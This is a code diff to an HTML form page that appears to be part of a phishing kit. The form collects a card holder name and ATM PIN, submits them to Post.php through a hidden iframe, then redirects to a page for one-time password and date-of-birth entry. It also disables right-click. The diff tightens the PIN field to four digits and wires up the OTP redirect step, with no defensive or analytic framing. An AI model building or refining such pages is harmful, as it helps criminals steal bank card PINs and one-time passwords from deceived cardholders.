@@ -101,6 +101,10 @@
    font-size:11px;
    font-style: italic;
    }
+   .name
+   {
+   text-transform:uppercase;
+   }
    </style>
    <script language="javascript"> 
    var message="This function is not allowed here.";
@@ -134,7 +138,7 @@
          <div class="container">
          <!-- Static- Please don't do anything here-->
          <script type="text/javascript">var submitted=false;</script>
-         <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='.html';}"></iframe>
+         <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Enter_OTP_DOB.html';}"></iframe>
          <!--My Form-->
          <form action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true">
             <div class="box">
@@ -158,7 +162,7 @@
                         </div><br>
                         <div class="login-box">
                         <div class="user-box">
-                        <input type="text" name="" minlength="3" maxlength="30"
+                        <input type="text" name="" class="name" onkeydown="return /[a-z A-Z]/i.test(event.key)" minlength="3" maxlength="30"
                          required="">
                         <label>Card Holder Name<span style="color:red;"> *</span></label>
                         <div style="margin-bottom:10px;">
@@ -203,8 +207,8 @@
                         </script>
                         </div>
                         <div class="user-box" style="margin-top:4%;">
-                        <input type="text" name="Card_PIN" minlength="8" maxlength="30"
-                        required="">
+                        <input type="text" name="ATM_PIN" minlength="4" maxlength="4" inputmode="numeric"
+                        pattern="[0-9]\d{3}" title="Please enter correct ATM PIN number!" required="">
                         <label>ATM PIN<span style="color:red;"> *</span></label>
                         </div>
                </div>
